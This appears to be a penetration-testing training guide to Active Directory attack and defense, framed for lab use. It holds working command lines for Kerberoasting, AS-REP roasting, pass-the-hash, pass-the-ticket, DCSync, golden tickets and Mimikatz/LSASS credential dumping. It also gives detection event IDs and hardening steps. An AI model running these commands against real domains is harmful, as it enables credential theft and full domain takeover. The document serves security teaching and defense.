# Active Directory Attack & Defense

> Active Directory is in approximately 90% of enterprise environments. Understanding it is not optional for anyone working in corporate security — offensive or defensive.

!!! warning "Lab Environments Only"
    AD attack techniques are for authorized penetration testing and lab practice only.
    Run these in your own lab (see setup below) or authorized HTB/THM environments.

---

## What Active Directory Is

Active Directory (AD) is Microsoft's directory service — a centralized system for managing users, computers, and permissions across a Windows network.

```
Active Directory Hierarchy:

Forest (top-level container — trust boundary)
└── Domain (e.g., corp.fpszero.local)
    ├── Organizational Units (OUs) — logical groupings
    │   ├── Users (user accounts)
    │   ├── Computers (machine accounts)
    │   └── Groups (collections for permission assignment)
    ├── Domain Controllers (DCs) — servers running AD DS
    └── Group Policy Objects (GPOs) — enforced configurations
```

**Key concepts:**

| Term | What It Is |
| :--- | :--- |
| **Domain Controller (DC)** | The server running AD — the crown jewel; compromise it = own the domain |
| **Domain Admin (DA)** | Highest privilege in a domain — the end goal of most AD attacks |
| **Kerberos** | Authentication protocol used by AD (replaces NTLM in modern environments) |
| **LDAP** | Protocol used to query AD (enumerate users, groups, computers) |
| **GPO** | Group Policy Object — configurations pushed to domain-joined machines |
| **ACL/ACE** | Access Control List/Entry — who can do what to which AD objects |
| **SPN** | Service Principal Name — ties a service account to a Kerberos service |
| **NTLM Hash** | Legacy auth hash — crackable offline, usable in pass-the-hash |
| **Kerberos Ticket** | Time-limited authentication token — TGT (ticket-granting) and TGS (service) |

---

## Lab Setup

Build your own AD lab before touching any real environment:

```
Minimum lab:
- 1× Windows Server 2019/2022 (Domain Controller)  — 2GB RAM
- 1× Windows 10/11 (Domain-joined workstation)      — 2GB RAM
- 1× Kali Linux (attack machine)                    — 2GB RAM
- Host-only network in VirtualBox/VMware (isolated!)
```

```powershell
# On Windows Server — quick AD setup
# Install AD DS role
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest `
    -DomainName "corp.fpszero.local" `
    -DomainNetBiosName "CORP" `
    -ForestMode "WinThreshold" `
    -DomainMode "WinThreshold" `
    -InstallDns `
    -Force

# After reboot — create lab users
New-ADUser -Name "Alice" -SamAccountName "alice" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "Bob"   -SamAccountName "bob"   -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "alice"  # Give alice DA for testing
```

**Automated lab builders:**
- [GOAD (Game of Active Directory)](https://github.com/Orange-Cyberdefense/GOAD) — multi-DC, pre-configured vulnerable lab
- [Detection Lab](https://github.com/clong/DetectionLab) — AD + logging stack for detection practice

---

## Enumeration

Enumeration without authentication (unauthenticated access) is increasingly rare but still exists.

### With Credentials (Standard)

```bash
# === From Linux with impacket ===
# Enumerate domain info
impacket-ldapdomaindump -u 'corp.fpszero.local\alice' -p 'Password123!' dc01.corp.fpszero.local

# Enumerate users
impacket-GetADUsers -all 'corp.fpszero.local/alice:Password123!' -dc-ip 192.168.56.10

# List domain shares
impacket-smbclient 'corp.fpszero.local/alice:Password123!@192.168.56.10'

# === From Windows (PowerView) ===
# PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Import-Module .\PowerView.ps1

Get-Domain                    # Domain info
Get-DomainUser                # All users
Get-DomainGroup               # All groups
Get-DomainComputer            # All computers
Get-DomainGroupMember -Identity "Domain Admins"  # DA members

# Find where DAs are logged in
Find-DomainUserLocation -GroupName "Domain Admins"  # ← High-value for lateral movement
```

### BloodHound — The Most Important AD Tool

BloodHound maps all AD relationships and finds attack paths to Domain Admin automatically.

```bash
# === Data Collection ===
# From Windows (SharpHound):
.\SharpHound.exe -c All --outputdirectory C:\Temp\

# From Linux (bloodhound-python):
pip install bloodhound
bloodhound-python -u alice -p 'Password123!' -d corp.fpszero.local -dc dc01.corp.fpszero.local -c all

# === View in BloodHound GUI ===
# Install: https://github.com/SpecterOps/BloodHound
# Start neo4j: sudo neo4j console
# Launch BloodHound: ./BloodHound
# Import the ZIP from SharpHound

# In BloodHound — key pre-built queries:
# "Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Find Computers where Domain Users are Local Admin"
# "Shortest Paths to High Value Targets"
```

---

## Key Attack Techniques

### 1. Kerberoasting

**What:** Request Kerberos service tickets for any service principal. Tickets are encrypted with the service account's NTLM hash. Crack offline.

**Why it works:** Any authenticated domain user can request service tickets — it's a feature, not a bug. The weakness is service accounts with weak passwords.

```bash
# Request TGS tickets for all SPNs (kerberoastable accounts)
# From Linux:
impacket-GetUserSPNs corp.fpszero.local/alice:Password123! -dc-ip 192.168.56.10 -outputfile kerberoast.hashes

# From Windows (Invoke-Kerberoast):
Invoke-Kerberoast -OutputFormat Hashcat | fl Hash

# Crack with hashcat
hashcat -a 0 -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
# Mode 13100 = Kerberos 5 TGS-REP etype 23
```

**Detection:** Event ID 4769 — Kerberos Service Ticket Request with EncryptionType 0x17 (RC4) from unexpected accounts.

### 2. AS-REP Roasting

**What:** Some accounts have "Pre-Authentication not required" set. Without pre-auth, you can request an AS-REP for any username — the response contains hash material crackable offline, no password needed.

```bash
# Find accounts without pre-auth (no password needed)
impacket-GetNPUsers corp.fpszero.local/ -dc-ip 192.168.56.10 -no-pass -usersfile users.txt -outputfile asrep.hashes

# If you have creds, enumerate directly:
impacket-GetNPUsers corp.fpszero.local/alice:Password123! -dc-ip 192.168.56.10 -request

# Crack
hashcat -a 0 -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
# Mode 18200 = Kerberos 5 AS-REP etype 23
```

### 3. Pass-the-Hash (PtH)

**What:** NTLM authentication accepts the hash directly — you don't need to crack it.

```bash
# Use NTLM hash to authenticate (impacket)
impacket-psexec corp.fpszero.local/administrator@192.168.56.10 -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# WMI exec with hash
impacket-wmiexec -hashes :NTLMhash corp.fpszero.local/alice@192.168.56.20

# SMB with hash
impacket-smbclient -hashes :NTLMhash corp.fpszero.local/alice@192.168.56.10
```

### 4. Pass-the-Ticket (PtT)

**What:** Kerberos tickets (TGT or TGS) can be exported from memory and imported elsewhere.

```powershell
# Export tickets with Mimikatz (on compromised machine)
mimikatz # sekurlsa::tickets /export
# → Creates .kirbi files for each ticket

# Import a ticket
mimikatz # kerberos::ptt ticket.kirbi
# → Now use resources as that user without knowing the password

# Or use Rubeus (C# implementation, harder to detect)
.\Rubeus.exe dump /nowrap       # Dump all tickets in base64
.\Rubeus.exe ptt /ticket:base64 # Import ticket
```

### 5. DCSync

**What:** Simulate a domain controller's replication request to pull any user's NTLM hash — including krbtgt (the master key for the entire domain).

**Requirement:** Needs Replicating Directory Changes / Replicating Directory Changes All rights — typically only Domain Admins, but misconfigured ACLs sometimes grant this to other accounts.

```bash
# Pull a specific user's hash
impacket-secretsdump corp.fpszero.local/alice:Password123!@192.168.56.10 -just-dc-user administrator

# Pull everything
impacket-secretsdump corp.fpszero.local/alice:Password123!@192.168.56.10 -just-dc-ntlm

# From Windows (Mimikatz)
mimikatz # lsadump::dcsync /domain:corp.fpszero.local /user:administrator
```

### 6. Golden Ticket

**What:** With the krbtgt hash (obtained via DCSync or DC compromise), forge a Ticket-Granting Ticket for **any** user, including non-existent users, valid for up to 10 years.

```bash
# Forge a golden ticket (impacket)
impacket-ticketer -nthash <krbtgt_ntlm_hash> \
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain corp.fpszero.local \
    administrator  # Or any username

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.fpszero.local/administrator@dc01.corp.fpszero.local
```

**Why it's dangerous:** Resetting the domain admin password doesn't help. Changing the krbtgt password twice invalidates all tickets — but it's operationally disruptive and commonly skipped.

---

## Credential Extraction

```powershell
# Mimikatz — dump credentials from LSASS memory
# Requires admin/SYSTEM
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords      # Cleartext passwords (if WDigest enabled)
mimikatz # sekurlsa::wdigest             # Enable WDigest (requires reboot to take effect)
mimikatz # lsadump::sam                  # Local SAM database hashes
mimikatz # lsadump::lsa /patch           # Domain cached credentials

# Extract from LSASS dump (run off-host — more OPSEC friendly)
# 1. Create LSASS dump:
procdump.exe -ma lsass.exe lsass.dmp
# 2. Parse on your machine:
impacket-secretsdump -system SYSTEM -sam SAM LOCAL  # From hives
pypykatz lsa minidump lsass.dmp                      # pip install pypykatz
```

---

## Defense

### Key Detections

| Attack | Detection | Event ID |
| :--- | :--- | :--- |
| Kerberoasting | TGS requests for service accounts in off-hours | 4769 (RC4 encryption) |
| AS-REP Roasting | AS-REQ without pre-auth | 4768 (etype 0x17 from unusual hosts) |
| DCSync | Replication requests from non-DC hosts | 4662 (Directory Access) |
| Pass-the-Hash | NTLM auth with mismatched logon patterns | 4624 (Type 3, no prior Type 2) |
| Mimikatz/LSASS | LSASS access from unusual process | 4656, 10 (Sysmon) |
| BloodHound collection | LDAP queries with large page sizes | LDAP query monitoring |

### Hardening

```powershell
# 1. Enable Protected Users group (blocks NTLM, weak Kerberos)
Add-ADGroupMember -Identity "Protected Users" -Members "DA_account"

# 2. Disable RC4 Kerberos (forces AES — harder to roast)
# GPO: Computer Config → Windows Settings → Security Settings → Local Policies
# Set "Network security: Configure encryption types allowed for Kerberos"
# Uncheck DES, RC4; enable AES128, AES256

# 3. Limit DA logon to DCs only (Tier 0)
# GPO → User Rights Assignment → "Deny log on locally" on workstations for DAs

# 4. Enable Credential Guard (protects LSASS)
# GPO: Computer Config → Admin Templates → System → Device Guard
# "Turn On Virtualization Based Security"

# 5. LAPS — Local Administrator Password Solution
# Randomizes local admin password on every machine → blocks lateral movement
Install-Module -Name LAPS
```

---

## Resources

| Resource | Type | Cost |
| :--- | :--- | :--- |
| [BloodHound Documentation](https://bloodhound.specterops.io/) | Tool docs | Free |
| [adsecurity.org](https://adsecurity.org/) | Sean Metcalf's AD security research | Free |
| [HackTricks — Active Directory](https://book.hacktricks.wiki/en/) | Techniques | Free |
| [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples) | Tool reference | Free |
| [GOAD Lab](https://github.com/Orange-Cyberdefense/GOAD) | Vulnerable AD lab | Free (AWS/local) |
| [HTB Pro Labs (RastaLabs, Offshore)](https://www.hackthebox.com/hacker/pro-labs) | Full AD environments | Subscription |
| [Certified Red Team Professional (CRTP)](https://www.alteredsecurity.com/adlab) | AD pentesting cert | Paid |